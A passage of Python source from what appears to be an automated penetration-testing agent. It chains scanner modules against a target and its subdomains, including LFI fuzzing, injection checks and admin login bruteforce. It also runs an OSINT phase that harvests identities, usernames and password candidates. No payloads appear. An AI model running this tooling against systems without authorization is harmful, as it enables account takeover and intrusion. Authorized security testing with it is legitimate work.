        if float(confidence.get("api", 0.0) or 0.0) >= 0.6:
            specializations.add("api")
        if any(t in corpus for t in ("grafana", "jenkins", "tomcat", "phpmyadmin")):
            specializations.add("admin_surface")
        return specializations

    def _result_indicates_positive_detection(self, result):
        if bool(result.get("vulnerable")):
            return True
        message = str(result.get("message", "")).lower()
        if any(marker in message for marker in NEGATIVE_EVIDENCE_MARKERS):
            return False
        return any(marker in message for marker in POSITIVE_SCAN_MESSAGE_MARKERS)

    def _is_actionable_finding(self, result):
        if not isinstance(result, dict) or not result.get("vulnerable"):
            return False
        if self._is_network_error_result(result):
            return False

        path = str(result.get("path", "")).lower()
        message = str(result.get("message", "")).lower()
        severity = str(result.get("severity", "")).lower()
        details = result.get("details", {}) or {}
        exploit_path = self._catalog.normalize_exploit_module_path(result.get("exploit_module"))

        if exploit_path:
            return True
        if isinstance(details, dict) and (
            details.get("authenticated_as")
            or details.get("post_login_snippet")
            or details.get("post_login_final_url")
        ):
            return True
        if self._catalog.is_pure_technology_detection_module(path, message):
            return False
        if any(token in path for token in (
            "admin_panel_detect",
            "simple_login_scanner",
            "login_page_detector",
            "admin_login_bruteforce",
        )):
            return True
        if severity in ("critical", "high", "medium"):
            return True
        if severity in ("low", "info") and any(token in message for token in (
            "login page detected",
            "login panel",
            "valid credentials",
            "authenticated as",
            "missing headers",
            "exposed:",
            "robots.txt exposed",
            "information leak",
        )):
            return True

        # Drop broad technology enumeration / generic fuzz summaries from exploitation reasoning.
        noisy_detection_tokens = (
            "wordpress_scanner",
            "wordpress_enum_user",
            "wp_plugin_scanner",
            "drupal_scanner",
            "joomla_scanner",
            "api_fuzzer",
            "auxiliary/scanner/http/robots",
            "crawler",
            "cors_misconfig",
            "csp_bypass",
            "debug_info_leak",
        )
        if any(token in path for token in noisy_detection_tokens):
            signal_blob = " ".join([
                message,
                str(details).lower(),
                str(result.get("module", "")).lower(),
            ])
            if exploit_path:
                return True
            if any(marker in signal_blob for marker in (
                "cve-",
                "cve_",
                "rce",
                "command execution",
                "authenticated as",
                "valid credentials",
                "auth bypass",
                "vulnerable",
            )):
                return True
            return False

        return bool(message and severity)

    def _execute_modules_targeted(self, scanner, modules, state, verbose=False):
        """
        Execute injection modules with context-aware option overrides when possible.
        """
        results = []
        target_info = state.target_info
        knowledge_base = state.knowledge_base
        scheme = target_info.get("scheme", "http")
        hostname = target_info.get("hostname", "")
        port = target_info.get("port", 80)
        base_url = f"{scheme}://{hostname}:{port}"
        discovered_endpoints = knowledge_base.get("discovered_endpoints", [])
        discovered_params = knowledge_base.get("discovered_params", [])
        param_profile = self._build_param_profile(knowledge_base)

        preferred_endpoint = "/"
        for endpoint in discovered_endpoints:
            if "?" in endpoint:
                preferred_endpoint = endpoint
                break
        if preferred_endpoint == "/" and discovered_endpoints:
            preferred_endpoint = discovered_endpoints[0]

        preferred_param = "id"
        for candidate in ("id", "q", "query", "search", "url", "file", "path", "page"):
            if candidate in [p.lower() for p in discovered_params]:
                preferred_param = candidate
                break

        for module_info in modules:
            if self._phase_stop_reason(state, "targeted"):
                break
            module_path = module_info.get("path")
            result = {
                "module": module_info.get("name", module_path),
                "path": module_path,
                "status": "error",
                "vulnerable": False,
                "message": "",
                "details": {},
            }
            block_reason = self._module_block_reason_for_profile(state, module_path)
            if block_reason:
                result["status"] = "skipped"
                result["message"] = block_reason
                result["details"] = {"safety_profile": self._normalized_safety_profile(state)}
                results.append(result)
                continue
            unreachable_skip = self._unreachable_target_module_skip_reason(state, module_path)
            if unreachable_skip:
                result["status"] = "skipped"
                result["message"] = unreachable_skip
                results.append(result)
                continue
            if not self._consume_network_units(state, 1):
                results.append(self._budget_skip_result(module_info, "targeted"))
                continue

            self._sleep_between_agent_actions(state, f"targeted:{module_path}")
            announced_bruteforce = False
            if "admin_login_bruteforce" in str(module_path).lower():
                login_path = (
                    self._select_best_login_path(state.knowledge_base)
                    or "/admin/login"
                )
                print_status(f"Trying admin login bruteforce on {login_path}")
                announced_bruteforce = True
            set_thread_output_quiet(not verbose)
            try:
                module_instance = self.framework.module_loader.load_module(
                    module_path,
                    load_only=False,
                    framework=self.framework,
                )
                if not module_instance:
                    result["message"] = "Failed to load module"
                    results.append(result)
                    continue

                # Baseline target options
                if hasattr(module_instance, "target"):
                    module_instance.set_option("target", hostname)
                if hasattr(module_instance, "rhost"):
                    module_instance.set_option("rhost", hostname)
                if hasattr(module_instance, "rport"):
                    module_instance.set_option("rport", port)
                if hasattr(module_instance, "port"):
                    module_instance.set_option("port", port)
                if hasattr(module_instance, "ssl"):
                    module_instance.set_option("ssl", scheme == "https")

                self._seed_http_session_from_auth(module_instance, state)
                inferred_bf = {}
                if "admin_login_bruteforce" in str(module_path).lower():
                    inferred_bf = self._build_inferred_option_overrides([module_info], state).get(module_path, {})
                merged_auth = dict(self._infer_auth_option_overrides(module_instance, module_path, state))
                merged_auth.update(inferred_bf)
                self._apply_safe_module_options(module_instance, merged_auth, state=state)
                self._apply_sqli_context_options(module_instance, module_path, state)

                # Context-aware tuning for injection modules
                module_path_lower = str(module_path).lower()
                if hasattr(module_instance, "COMMON_PARAMS") and discovered_params:
                    module_instance.COMMON_PARAMS = list(dict.fromkeys([p.lower() for p in discovered_params]))[:20]
                if hasattr(module_instance, "URL_PARAMS") and discovered_params:
                    url_params = [p.lower() for p in discovered_params if p.lower() in (
                        "url", "uri", "redirect", "callback", "endpoint", "link", "path", "file"
                    )]
                    if url_params:
                        module_instance.URL_PARAMS = list(dict.fromkeys(url_params))[:20]

                # Some modules require a full URL target and parameter option.
                if "lfi_fuzzer" in module_path_lower:
                    lfi_target = preferred_endpoint
                    if lfi_target.startswith("/"):
                        lfi_target = f"{base_url}{lfi_target}"
                    if not lfi_target.startswith("http"):
                        lfi_target = base_url
                    module_instance.set_option("target", lfi_target)
                    if hasattr(module_instance, "parameter"):
                        file_param = preferred_param
                        if not param_profile["file_like"]:
                            file_param = "file"
                        module_instance.set_option("parameter", file_param)

                run_result = module_instance.run()
                result["vulnerable"] = bool(run_result)
                result["status"] = "vulnerable" if result["vulnerable"] else "safe"

                module_meta = getattr(module_instance, "__info__", {})
                dynamic_info = getattr(module_instance, "vulnerability_info", {}) or {}
                result["message"] = dynamic_info.get("reason") or module_meta.get("description", "")
                result["severity"] = dynamic_info.get("severity") or module_meta.get("severity")
                if dynamic_info.get("version"):
                    result["version"] = dynamic_info.get("version")
                exploit_path = self._catalog.normalize_exploit_module_path(module_meta.get("module"))
                if exploit_path:
                    result["exploit_module"] = exploit_path
                linked_modules = self._catalog.normalize_linked_module_paths(module_meta.get("modules"))
                if linked_modules:
                    result["linked_modules"] = linked_modules
                result["details"] = {
                    key: value for key, value in dynamic_info.items()
                    if key not in ("reason", "severity", "version")
                }
                if isinstance(run_result, dict):
                    result["details"].update(run_result)
                    if "error" in run_result and not dynamic_info.get("reason"):
                        result["message"] = str(run_result.get("error") or result["message"])
            except Exception as exc:
                result["message"] = f"Error: {exc}"
            finally:
                set_thread_output_quiet(False)
            results.append(result)
            if self._record_waf_signals_from_results(state, [result], "targeted"):
                break
            if verbose:
                status_icon = "[+]" if result["vulnerable"] else "[-]"
                print_info(f"{status_icon} {result['path']}: {result.get('message', '')}")
        return results

    def _pick_specialized_modules(self, modules, specializations, knowledge_base=None):
        """
        Pick modules matching adaptive specialization buckets.
        """
        if not specializations:
            return []

        kb = knowledge_base if isinstance(knowledge_base, dict) else {}

        specialization_tokens = {
            "wordpress": ("wordpress", "wp_", "wp-", "wpvivid", "wp_plugin"),
            "drupal": ("drupal",),
            "joomla": ("joomla",),
            "python_web": ("django", "flask", "fastapi", "python", "python_injection"),
            "node_web": ("nodejs", "node", "react", "angular", "vue"),
            "nextjs": ("nextjs", "next_js", "next-", "_next", "javascript", "js_endpoint", "webhook", "api_leak"),
            "api": ("api", "swagger", "graphql"),
            "admin_surface": ("grafana", "jenkins", "tomcat", "phpmyadmin", "admin", "login"),
        }

        tokens = set()
        for key in specializations:
            for token in specialization_tokens.get(key, ()):
                tokens.add(token)

        picked = []
        strong_wordpress = self._has_tech_evidence(kb, "wordpress", threshold=0.8)
        cms_lock = self._get_cms_lock_specializations(kb, specializations)
        for module in modules:
            blob = module_blob_lower(module)
            if not cms_lock and any(token in blob for token in CMS_HINT_TOKENS):
                continue
            if "wordpress_madara" in blob and not strong_wordpress:
                continue
            if any(token in blob for token in tokens):
                picked.append(module)
                continue
            if kb_client_js_surface_ready(kb) and str(module.get("path", "")) in CLIENT_JS_INTEL_MODULES:
                picked.append(module)
                continue
            if "nextjs" in specializations and str(module.get("path", "")) in CLIENT_JS_INTEL_MODULES:
                picked.append(module)
        return picked

    def _pick_followup_modules(self, results, modules, knowledge_base=None):
        """
        Chain additional modules based on concrete detections.
        """
        detection_tokens = set()
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        auth_session = self._has_authenticated_session(kb)
        risk_signals_lower = [str(s).lower() for s in kb.get("risk_signals", [])]
        tech_hints_lower = [str(h).lower() for h in kb.get("tech_hints", [])]
        login_risk = {"login_redirect_detected", "login_form_detected", "login_surface_detected"}
        for s in risk_signals_lower:
            if not auth_session and s in login_risk:
                detection_tokens.add("login_surface")
            if s in ("graphql_surface_detected", "api_surface_detected", "js_sourcemap_recovered"):
                detection_tokens.add("api")
                detection_tokens.add("javascript")
        for h in tech_hints_lower:
            if not auth_session and h in ("auth_portal", "login"):
                detection_tokens.add("login_surface")
            if h in ("nextjs", "react", "nodejs", "api", "graphql", "swagger"):
                detection_tokens.add(h)

        # Concrete login URLs from fingerprint / parsers: always chain auth follow-ups.
        if not auth_session and any(isinstance(p, str) and p.startswith("/") for p in kb.get("login_paths", [])):
            detection_tokens.add("login_surface")

        wanted = set()
        for result in results:
            if not result.get("vulnerable"):
                continue
            for linked_path in self._catalog.normalize_linked_module_paths(result.get("linked_modules")):
                wanted.add(linked_path)
            det = result.get("details", {}) or {}
            det_piece = ""
            if isinstance(det, dict):
                for key in ("post_login_snippet", "post_login_final_url", "authenticated_as"):
                    val = det.get(key)
                    if isinstance(val, str) and val:
                        det_piece += " " + val[:4000]
            blob = " ".join([str(result.get("message", "")), det_piece]).lower()
            for token in (
                "wordpress", "phpmyadmin", "apache", "nginx", "robots", "sitemap",
                "security headers", "missing headers", "api", "swagger", "graphql",
                "nextjs", "next.js", "/_next/", "__next_data__", "javascript",
                "admin panel", "login panel", "wp-login.php", "/admin", "administrator",
                "/login.php", "login.php", "/login", "signin", "auth/login",
            ):
                if token in blob:
                    detection_tokens.add(token)

        token_map = {
            "wordpress": (
                "auxiliary/scanner/http/wp_plugin_scanner",
                "auxiliary/scanner/http/wordpress_enum_user",
                "scanner/http/wordpress_detect",
            ),
            "phpmyadmin": (
                "scanner/http/phpmyadmin_detect",
                "auxiliary/scanner/http/lfi_fuzzer",
            ),
            "apache": (
                "auxiliary/scanner/http/apache_vuln_scanner",
            ),
            "nginx": (
                "auxiliary/scanner/http/nginx_vuln_scanner",
            ),
            "robots": (
                "auxiliary/scanner/http/crawler",
            ),
            "sitemap": (
                "auxiliary/scanner/http/crawler",
            ),
            "security headers": (
                "auxiliary/scanner/http/cors_misconfig",
                "auxiliary/scanner/http/csp_bypass",
            ),
            "missing headers": (
                "auxiliary/scanner/http/cors_misconfig",
                "auxiliary/scanner/http/csp_bypass",
            ),
            "nextjs": CLIENT_JS_INTEL_MODULES,
            "next.js": CLIENT_JS_INTEL_MODULES,
            "/_next/": CLIENT_JS_INTEL_MODULES,
            "__next_data__": CLIENT_JS_INTEL_MODULES,
            "javascript": CLIENT_JS_INTEL_MODULES,
            "react": CLIENT_JS_INTEL_MODULES,
            "nodejs": CLIENT_JS_INTEL_MODULES + (
                "auxiliary/scanner/http/nodejs_injection",
            ),
            "api": (
                "scanner/http/swagger_detect",
                "scanner/http/graphql_detect",
                "auxiliary/scanner/http/api_fuzzer",
            ),
            "swagger": ("scanner/http/swagger_detect",),
            "graphql": ("scanner/http/graphql_detect",),
            "admin panel": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "login panel": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "wp-login.php": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "/admin": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "administrator": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "login_surface": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "/login.php": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "login.php": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "/login": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "signin": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
            "auth/login": (
                "auxiliary/scanner/http/login_page_detector",
                "auxiliary/scanner/http/login/admin_login_bruteforce",
            ),
        }

        for token in detection_tokens:
            for path in token_map.get(token, ()):
                wanted.add(path)

        for path in suggest_chain_module_paths(kb):
            wanted.add(path)

        if auth_session:
            auth_skip_tokens = ("login_page_detector", "admin_login_bruteforce")
            wanted = {
                p for p in wanted
                if not any(t in p.lower() for t in auth_skip_tokens)
            }

        if not wanted:
            return []

        # If we already collected login URL paths (including root ``/``), skip re-discovery and run bruteforce first.
        # Note: root ``/`` was previously excluded here, which wrongly treated "login on home page" as unknown surface.
        has_concrete_login_paths = any(
            isinstance(p, str) and p.startswith("/")
            for p in kb.get("login_paths", [])
        )
        if has_concrete_login_paths:
            wanted.discard("auxiliary/scanner/http/login_page_detector")

        selected = []
        for module in modules:
            if module_path_lower(module) in wanted:
                selected.append(module)

        def _followup_auth_order(mod):
            p = module_path_lower(mod)
            # When paths are unknown, probe with login_page_detector before bruteforce; otherwise bruteforce first.
            prefer_bf_first = has_concrete_login_paths
            if p.endswith("login_page_detector"):
                return 2 if prefer_bf_first else 0
            if "admin_login_bruteforce" in p:
                return 0 if prefer_bf_first else 1
            return 5

        selected.sort(key=_followup_auth_order)
        # Enforce CMS lock to avoid generic fuzzing follow-ups.
        cms_specs = set([t for t in detection_tokens if t in CMS_LOCK_NAMES])
        return self._filter_modules_for_cms_lock(selected, knowledge_base or {}, specializations=cms_specs)

    def _smart_select_modules(self, state: AgentState, modules, scanner):
        """
        Two-phase strategy:
        1) quick recon/fingerprinting modules
        2) targeted module subset based on discovered technologies
        """
        verbose = bool(state.verbose)
        max_modules = int(state.max_modules)
        recon_budget = int(state.recon_modules)

        # If protocol is explicit and narrow (non-http), keep deterministic scope.
        forced_protocol = state.protocol
        if forced_protocol and forced_protocol not in ("http", "https"):
            return modules[:max_modules]

        recon_candidates = self._pick_recon_modules(modules, state)
        recon_candidates = recon_candidates[:recon_budget]

        if verbose:
            print_info(
                f"Smart selection: running {len(recon_candidates)} recon module(s) "
                f"before choosing up to {max_modules} modules."
            )

        tech_hints = set()
        if recon_candidates:
            recon_results = self._execute_agent_modules(
                state,
                scanner,
                recon_candidates,
                state.target_info,
                max(2, min(6, int(state.threads))),
                False,
                "smart-recon",
            )
            tech_hints = self._extract_tech_hints(recon_results)

        selected = self._rank_targeted_modules(
            modules,
            tech_hints,
            max_modules,
            knowledge_base=state.knowledge_base,
        )
        if verbose:
            hints_display = ", ".join(sorted(tech_hints)) if tech_hints else "none"
            print_info(f"Technology hints: {hints_display}")
            print_info(f"Selected modules: {len(selected)} / {len(modules)}")

        return selected

    def _select_modules_for_target(self, state: AgentState, modules):
        protocol = state.protocol
        target_info = state.target_info
        raw_target = str(state.raw_target).strip().lower()
        verbose = bool(state.verbose)

        # If user explicitly asked for a protocol, respect it.
        if protocol:
            filtered = self._filter_modules_by_protocol(modules, protocol=protocol)
            if verbose:
                print_info(f"Module profile: forced protocol '{protocol}' ({len(filtered)} modules)")
            return self._merge_expanded_surface_if(state, filtered, modules)

        # Web-first profile for domains/URLs (avoid smb/ldap/etc by default).
        scheme = str(target_info.get("scheme", "")).lower()
        is_url_like = raw_target.startswith("http://") or raw_target.startswith("https://")
        is_host_port = ":" in raw_target and not is_url_like
        if scheme in ("http", "https") and not is_host_port:
            filtered = self._filter_modules_by_protocol(modules, protocol="http")
            if verbose:
                print_info(f"Module profile: web-only default ({len(filtered)} modules)")
            return self._merge_expanded_surface_if(state, filtered, modules)

        # For explicit host:port targets, keep scanner's port-aware behavior.
        port = target_info.get("port")
        if port:
            protocol_guess = self._port_to_protocol(port)
            if protocol_guess:
                filtered = self._filter_modules_by_protocol(modules, protocol=protocol_guess)
                if filtered:
                    if verbose:
                        print_info(f"Module profile: port-aware ({port}) ({len(filtered)} modules)")
                    return self._merge_expanded_surface_if(state, filtered, modules)

        if getattr(state, "expanded_surface", False) and isinstance(state.knowledge_base, dict):
            state.knowledge_base["expanded_surface"] = True
        return modules

    def _is_expanded_surface_module_path(self, path: str) -> bool:
        pl = (path or "").lower().replace("\\", "/")
        return any(pl.startswith(p) for p in EXPANDED_SURFACE_MODULE_PREFIXES)

    def _merge_expanded_surface_modules(self, filtered: List[Any], full_modules: List[Any]) -> List[Any]:
        seen: set = set()
        out: List[Any] = []
        for m in full_modules:
            p = str(m.get("path") or "").strip()
            if not p or p in seen:
                continue
            if not self._is_expanded_surface_module_path(p):
                continue
            seen.add(p)
            out.append(m)
        for m in filtered:
            p = str(m.get("path") or "").strip()
            if not p or p in seen:
                continue
            seen.add(p)
            out.append(m)
        return out

    def _merge_expanded_surface_if(self, state: AgentState, filtered: List[Any], full_modules: List[Any]) -> List[Any]:
        if not getattr(state, "expanded_surface", False):
            return filtered
        kb = state.knowledge_base
        if isinstance(kb, dict):
            kb["expanded_surface"] = True
        return self._merge_expanded_surface_modules(filtered, full_modules)

    def _organization_root_domain(self, hostname: str) -> str:
        h = (hostname or "").lower().strip(".")
        if h.startswith("www."):
            return h[4:]
        return h

    def _hostname_in_seed_family(self, seed: str, candidate: str) -> bool:
        s = self._organization_root_domain(seed)
        c = self._organization_root_domain(candidate)
        if not s or not c or "." not in c:
            return False
        if len(c) > 200:
            return False
        if c == s:
            return True
        return c.endswith("." + s)

    def _collect_strings_from_details_object(self, obj: Any, sink: List[str], depth: int = 0) -> None:
        if depth > 14 or len(sink) > 4000:
            return
        if isinstance(obj, dict):
            for v in obj.values():
                self._collect_strings_from_details_object(v, sink, depth + 1)
        elif isinstance(obj, (list, tuple, set)):
            for v in list(obj)[:900]:
                self._collect_strings_from_details_object(v, sink, depth + 1)
        elif isinstance(obj, (str, int, float, bool)):
            sink.append(str(obj))

    def _hostname_looks_valid(self, host: str) -> bool:
        h = (host or "").strip().lower().strip(".")
        if not h or len(h) > 200 or ".." in h or "/" in h or " " in h or "*" in h:
            return False
        if h in ("localhost", "127.0.0.1", "::1"):
            return False
        if h.endswith((".arpa", ".local")):
            return False
        parts = h.split(".")
        if len(parts) < 2:
            return False
        for p in parts:
            if not p or len(p) > 63:
                return False
            if not re.match(r"^[a-z0-9]([a-z0-9-]*[a-z0-9])?$", p, re.I):
                return False
        return True

    def _extract_hosts_from_free_text(self, text: str, sink: set) -> None:
        if not text:
            return
        for m in ABSOLUTE_URL_RE.finditer(text):
            try:
                parsed = urllib.parse.urlparse(m.group(0))
                if parsed.hostname:
                    sink.add(parsed.hostname.lower())
            except Exception:
                continue
        for m in re.finditer(
            r"@([a-z0-9](?:[a-z0-9._-]*[a-z0-9])?\.(?:[a-z0-9-]{1,63}\.)+[a-z]{2,63})",
            text,
            re.I,
        ):
            sink.add(m.group(1).lower())
        for token in re.findall(
            r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}\b",
            text.lower(),
        ):
            sink.add(token)

    def _hosts_from_scan_result(self, result: Dict[str, Any]) -> List[str]:
        sink: set = set()
        strings: List[str] = []
        details = result.get("details") if isinstance(result, dict) else None
        if isinstance(details, dict):
            self._collect_strings_from_details_object(details, strings)
        if isinstance(result, dict):
            strings.append(str(result.get("message", "") or ""))
        blob = " ".join(strings)
        self._extract_hosts_from_free_text(blob, sink)
        return [h for h in sink if self._hostname_looks_valid(h)]

    def _harvest_derived_hosts(self, seed_hostname: str, results: List[Any]) -> List[str]:
        ordered: List[str] = []
        seen: set = set()
        seed_l = (seed_hostname or "").lower().strip(".")
        for row in results or []:
            if not isinstance(row, dict):
                continue
            for h in self._hosts_from_scan_result(row):
                hl = h.lower()
                if hl == seed_l or hl in seen:
                    continue
                if not self._hostname_in_seed_family(seed_hostname, h):
                    continue
                seen.add(hl)
                ordered.append(hl)
        return ordered

    def _derived_scan_limits(self, state: AgentState) -> Tuple[int, int]:
        max_h = min(
            DERIVED_HOST_SCAN_MAX_HOSTS,
            max(2, int(state.max_modules) // 4),
        )
        per = min(
            DERIVED_HOST_SCAN_MODULES_PER_HOST,
            max(4, int(state.max_modules) // 5),
        )
        return max_h, per

    def _run_derived_host_surface_scans(
        self,
        state: AgentState,
        scanner: ScannerCommand,
        all_modules: List[Dict[str, Any]],
        primary_results: List[Any],
    ) -> List[Any]:
        if state.target_reachable is False:
            return primary_results
        seed = str((state.target_info or {}).get("hostname", "") or "").strip()
        if not seed:
            return primary_results
        hosts = self._harvest_derived_hosts(seed, primary_results)
        kb = state.knowledge_base
        if isinstance(kb, dict):
            kb_candidates = list(kb.get("subdomain_candidates") or [])
            seen = {h.lower() for h in hosts}
            seed_l = seed.lower().strip(".")
            for candidate in kb_candidates:
                hl = str(candidate).lower().strip(".")
                if not hl or hl == seed_l or hl in seen:
                    continue
                if not self._hostname_in_seed_family(seed, hl):
                    continue
                seen.add(hl)
                hosts.append(hl)
            kb["derived_target_candidates"] = list(hosts)
            kb.setdefault("derived_host_scans", [])
        if not hosts:
            return primary_results
        probe_candidates = len(hosts)
        hosts = self._probe_and_filter_live_derived_hosts(state, hosts)
        if isinstance(kb, dict):
            kb["derived_target_candidates"] = list(hosts)
        if not hosts:
            self._append_timeline_event(
                state,
                "scan",
                "Derived host scans skipped: no live HTTP hosts after probe.",
                extra={"candidates": probe_candidates, "live": 0},
            )
            return primary_results
        max_hosts, per_host = self._derived_scan_limits(state)
        http_pool = self._filter_modules_by_protocol(all_modules, "http")
        if not http_pool:
            return primary_results
        aggregated = list(primary_results)
        visited = {seed.lower()}
        self._append_timeline_event(
            state,
            "scan",
            f"Derived host scans: up to {max_hosts} hostname(s), {per_host} HTTP module(s) each.",
            extra={"candidates": len(hosts)},
        )
        ran = 0
        for host in hosts:
            if ran >= max_hosts:
                break
            hl = host.lower()
            if hl in visited:
                continue
            visited.add(hl)
            sub_target = scanner._parse_target(f"https://{host}/")
            if not sub_target:
                continue
            if bool(state.verbose):
                print_info(f"Derived HTTP scan ({ran + 1}/{max_hosts}): {host}")
            hints = list(kb.get("tech_hints", []) or []) if isinstance(kb, dict) else []
            specs = list(state.scan_specializations or [])
            batch = self._rank_targeted_modules(
                http_pool,
                hints,
                per_host,
                specializations=specs,
                knowledge_base=kb if isinstance(kb, dict) else {},
            )
            if not batch:
                continue
            sub_results = self._execute_agent_modules(
                state,
                scanner,
                batch,
                sub_target,
                max(2, min(int(state.threads), 6)),
                bool(state.verbose),
                f"derived-host:{host}",
            )
            aggregated.extend(sub_results)
            if isinstance(kb, dict):
                paths = [m.get("path") for m in batch if m.get("path")]
                self._update_knowledge_base_from_results(
                    kb,
                    sub_results,
                    paths,
                    hints,
                    specs,
                )
                kb["derived_host_scans"].append({
                    "host": host,
                    "modules": [m.get("path") for m in batch],
                    "count": len(sub_results),
                })
            ran += 1
        return aggregated

    def _is_europol_passive_mission(self, state: AgentState) -> bool:
        mission = str(
            getattr(getattr(state, "runtime_policy", None), "mission_profile", "") or ""
        ).strip().lower().replace("_", "-")
        return mission == "europol-passive"

    def _persist_osint_evidence_artifacts(
        self,
        state: AgentState,
        *,
        module_results: List[Dict[str, Any]],
        synthesis: Dict[str, Any],
        collector: Optional[OsintEvidenceCollector] = None,
        opsec_journal: Optional[OsintOpsecJournal] = None,
    ) -> None:
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        hostname = str((state.target_info or {}).get("hostname", "") or "").strip()
        root = organization_root_domain(hostname)
        legal_basis = str(kb.get("legal_basis") or kb.get("mandate_ref") or "")
        output_dir = None
        run_id = str(state.run_id or "").strip()
        if run_id:
            try:
                from interfaces.command_system.builtin.agent.run_store import AgentPathService

                output_dir = AgentPathService().run_dir(run_id) / "osint"
            except Exception:
                output_dir = None
        if output_dir is None:
            from pathlib import Path

            output_dir = Path("artifacts/osint") / (root or "unknown")

        try:
            from core.osint.gdpr import OsintRetentionPolicy

            passive = self._is_europol_passive_mission(state)
            data_controller = str(kb.get("data_controller") or "")
            retention_policy = OsintRetentionPolicy.from_osint_config()
            try:
                pii_days = int(
                    kb.get("retention_days")
                    or kb.get("osint_retention_days")
                    or retention_policy.pii_days
                )
            except (TypeError, ValueError):
                pii_days = retention_policy.pii_days
            if pii_days != retention_policy.pii_days or data_controller or passive:
                retention_policy = OsintRetentionPolicy(
                    pii_days=max(1, pii_days),
                    ioc_days=retention_policy.ioc_days,
                    audit_days=retention_policy.audit_days,
                    legal_basis_required=passive or retention_policy.legal_basis_required,
                    pseudonymize_exports=bool(
                        kb.get("osint_pseudonymize_exports", retention_policy.pseudonymize_exports)
                    ),
                    data_controller=data_controller or retention_policy.data_controller,
                    processing_purpose=retention_policy.processing_purpose,
                    lawful_basis_article=retention_policy.lawful_basis_article,
                )
            paths = write_osint_evidence_bundle(
                module_results=module_results,
                synthesis=synthesis,
                output_dir=output_dir,
                run_id=run_id,
                legal_basis=legal_basis,
                target=root,
                tlp=str(kb.get("tlp") or "AMBER"),
                actor="agent",
                workspace=str(state.workspace or "default"),
                passive_only=passive,
                opsec_journal=opsec_journal,
                retention_policy=retention_policy,
                data_controller=str(kb.get("data_controller") or ""),
                recipient_org=str(kb.get("recipient_org") or ""),
            )
            if isinstance(state.knowledge_base, dict):
                state.knowledge_base["osint_evidence_paths"] = paths
                if collector is not None:
                    state.knowledge_base["osint_evidence_verified"] = collector.verify()
                if opsec_journal is not None:
                    state.knowledge_base["osint_opsec_summary"] = opsec_journal.summarize()
            if bool(state.verbose):
                print_info(f"OSINT evidence bundle: {paths.get('manifest', output_dir)}")
        except Exception as exc:
            if bool(state.verbose):
                print_warning(f"OSINT evidence export skipped: {exc}")

    def _run_expanded_surface_intel_phase(
        self,
        state: AgentState,
        all_modules: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """``--all``: context-chained OSINT pipeline with linked intel graph."""
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        hostname = str((state.target_info or {}).get("hostname", "") or "").strip()
        if not hostname:
            return []
        if state.target_reachable is False and not self._hostname_is_osint_domain(hostname):
            return []
        root = organization_root_domain(hostname)
        persona_seed = str(kb.get("persona_name") or "").strip()
        if isinstance(state.knowledge_base, dict):
            state.knowledge_base["expanded_surface"] = True
            state.knowledge_base["target_hostname"] = hostname

        max_steps = min(
            EXPANDED_SURFACE_INTEL_MAX_MODULES,
            max(3, int(state.recon_modules or 12) // 2),
        )
        passive_only = self._is_europol_passive_mission(state)
        if passive_only and isinstance(state.knowledge_base, dict):
            state.knowledge_base.setdefault("retention_days", 90)
            state.knowledge_base.setdefault("osint_pseudonymize_exports", True)
            state.knowledge_base.setdefault("osint_require_legal_basis", True)
        if passive_only:
            max_steps = min(max(max_steps, 11), EXPANDED_SURFACE_INTEL_MAX_MODULES)
        if bool(state.verbose):
            print_info(
                f"Agent OSINT pipeline on {root} "
                f"(phased, max {max_steps} steps, persona={persona_seed or 'none'}"
                f"{', passive-LE' if passive_only else ''})"
            )
        self._append_timeline_event(
            state,
            "scan",
            f"Agent OSINT pipeline on {root}",
            kind="plan",
        )

        def _execute_batch(modules, option_overrides):
            return self._execute_plan_modules_with_options(
                modules,
                state,
                option_overrides=option_overrides,
                verbose=bool(state.verbose),
            )

        legal_basis = str(kb.get("legal_basis") or kb.get("mandate_ref") or "")
        evidence_collector = OsintEvidenceCollector(
            str(state.run_id or "agent-osint"),
            legal_basis=legal_basis,
            actor="agent",
        )
        opsec_journal = OsintOpsecJournal(
            workspace=str(state.workspace or "default"),
            case_id=root,
            legal_basis=legal_basis,
            passive_only=passive_only,
        )
        opsec_journal.record(action="pipeline_start", target=root, module="agent/osint-pipeline")

        results, synthesis = run_agent_intel_pipeline(
            execute_modules=_execute_batch,
            catalog_modules=all_modules,
            root_domain=root,
            persona_seed=persona_seed,
            max_steps=max_steps,
            passive_only=passive_only,
            evidence_collector=evidence_collector,
            opsec_journal=opsec_journal,
        )

        harvested_id = harvest_identities_from_results(results, root_domain=root)
        harvested_sub = harvest_subdomains_from_results(results, root_domain=root)
        password_candidates: List[str] = []
        if not passive_only:
            password_candidates = harvest_password_candidates_from_results(
                results,
                identities=harvested_id,
                root_domain=root,
            )
        merge_intel_into_knowledge_base(
            state.knowledge_base if isinstance(state.knowledge_base, dict) else {},
            identities=harvested_id,
            subdomains=harvested_sub,
            username_candidates=build_username_candidates(harvested_id) if not passive_only else [],
            password_candidates=password_candidates,
        )
        if isinstance(state.knowledge_base, dict):
            merge_osint_synthesis_into_knowledge_base(state.knowledge_base, synthesis)
            for line in synthesis.get("summary_lines", [])[:8]:
                print_info(f"  OSINT link: {line}")
            self._persist_osint_evidence_artifacts(
                state,
                module_results=results,
